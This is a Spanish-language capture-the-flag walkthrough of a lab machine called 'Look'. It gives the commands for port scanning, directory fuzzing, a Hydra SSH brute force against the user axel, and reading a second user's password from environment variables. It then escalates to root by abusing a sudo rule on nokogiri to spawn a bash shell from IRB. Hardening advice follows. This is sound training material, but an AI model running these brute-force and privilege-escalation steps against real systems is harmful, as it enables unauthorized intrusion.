
# 🚀 Explotación de Máquina Look (CTF)

![Nivel: Medio](https://img.shields.io/badge/Nivel-Medio-orange) ![Tema: Web Exploitation + PrivEsc](https://img.shields.io/badge/Tema-Web%20Exploitation%20%2B%20PrivEsc-blue)

## **Descripción**
Este documento detalla la explotación completa de la máquina **Look** de CTF, que incluye:
1. Reconocimiento de puertos y servicios
2. Fuzzing de directorios web
3. Fuerza bruta SSH con Hydra
4. Escalada de privilegios mediante variables de entorno
5. Explotación de binario nokogiri con sudo

**Tiempo estimado**: 45-60 minutos  
**Dificultad**: Medio  
**Sistema operativo**: Linux

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Fuerza Bruta SSH](#fuerza-bruta-ssh)
4. [Acceso Inicial](#acceso-inicial)
5. [Escalada de Privilegios](#escalada-de-privilegios)
6. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
````
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.0.2.8 -oN escaneo
````

**Resultados**:
- **Puerto 22/tcp**: SSH - OpenSSH
- **Puerto 80/tcp**: HTTP - Apache httpd

## **Enumeración Web**

### 2. Fuzzing de Directorios
```bash
gobuster dir -u http://10.0.2.16 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

**Hallazgo crítico**:
- **/info.php**: Revela el nombre de usuario **axel**

## **Fuerza Bruta SSH**

### 3. Ataque con Hydra
```bash
hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.16 -vvv -t 4 -F
```

**Credenciales obtenidas**:
- **Usuario**: axel
- **Contraseña**: [Encontrada en rockyou.txt]

## **Acceso Inicial**

### 4. Conexión SSH
```bash
ssh axel@10.0.2.16
```

### 5. Flag de Usuario
```bash
cat user.txt
```
- **User Flag**: `[Redacted]`

### 6. Tratamiento de TTY
```bash
# Mejorar shell interactiva
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
xterm
```

## **Escalada de Privilegios**

### 7. Enumeración de Variables de Entorno
```bash
env
```

**Hallazgo**:
- Contraseña del usuario **dylan** en variables de entorno

### 8. Cambio de Usuario
```bash
su dylan
```

### 9. Enumeración de Permisos Sudo
```bash
sudo -l
```

**Resultado**:
```
User dylan may run the following commands on look:
    (root) NOPASSWD: /usr/bin/nokogiri
```

### 10. Explotación de Nokogiri
```bash
sudo -u root /usr/bin/nokogiri /etc/passwd
```

### 11. Ejecución de Shell desde IRB
```ruby
exec '/bin/bash -i'
```

### 12. Flag de Root
```bash
find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
```
- **Root Flag**: `[Redacted]`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Exposición de información** en info.php
2. **Contraseña débil** de usuario axel
3. **Credenciales en variables de entorno**
4. **Permisos sudo peligrosos** en binario nokogiri

### Hardening Recomendado
- Validar y sanitizar salidas de PHP
- Implementar políticas de contraseñas robustas
- No almacenar credenciales en variables de entorno
- Revisar y restringir permisos sudo regularmente
- Implementar fail2ban para protección SSH

### Técnicas Aplicadas
1. **Escaneo de puertos** con Nmap
2. **Fuzzing de directorios** con Gobuster
3. **Fuerza bruta SSH** con Hydra
4. **Enumeración de variables de entorno**
5. **Explotación de binarios sudo**

---

**Herramientas utilizadas**:
- Nmap
- Gobuster
- Hydra
- Linux commands

**Referencias**:
- [Hydra Brute Force Tool](https://github.com/vanhauser-thc/thc-hydra)
- [Gobuster Directory Fuzzing](https://github.com/OJ/gobuster)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

**Tags**: `#CTF #Look #SSH #BruteForce #Sudo #PrivEsc #Nokogiri`

---

## **Lecciones Aprendidas**
- La información expuesta en endpoints puede ser el punto de entrada crítico
- Las variables de entorno pueden contener credenciales sensibles
- Los binarios con permisos sudo deben auditarse regularmente
- Las herramientas de desarrollo (nokogiri) pueden ser vectores de ataque

## **Notas Adicionales**
- Las direcciones IP deben ajustarse según el entorno de laboratorio
- Los tiempos de fuerza bruta pueden variar según la contraseña
- Siempre documentar y reportar vulnerabilidades encontradas

---

## **Comandos Críticos de Explotación**

### Reconocimiento
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.0.2.8 -oN escaneo
```

### Enumeración Web
```bash
gobuster dir -u http://10.0.2.16 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### Fuerza Bruta SSH
```bash
hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.16 -vvv -t 4 -F
```

### Escalada de Privilegios
```bash
sudo -u root /usr/bin/nokogiri /etc/passwd
# Luego en IRB: exec '/bin/bash -i'
```

### Búsqueda de Flags
```bash
find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
```
